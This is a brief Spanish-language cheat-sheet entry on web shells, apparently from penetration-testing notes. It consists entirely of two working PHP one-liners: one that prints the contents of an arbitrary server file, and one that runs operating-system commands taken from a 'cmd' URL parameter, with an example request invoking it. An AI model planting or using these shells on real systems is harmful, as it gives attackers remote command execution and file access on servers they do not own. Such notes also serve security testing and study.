## Webshells

Leer un fichero determinado

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Ejecutar comandos

```php
<?php echo system($_GET['cmd']); ?>

# Accesible mediante 

GET /example/exploit.php?cmd=id HTTP/1.1

```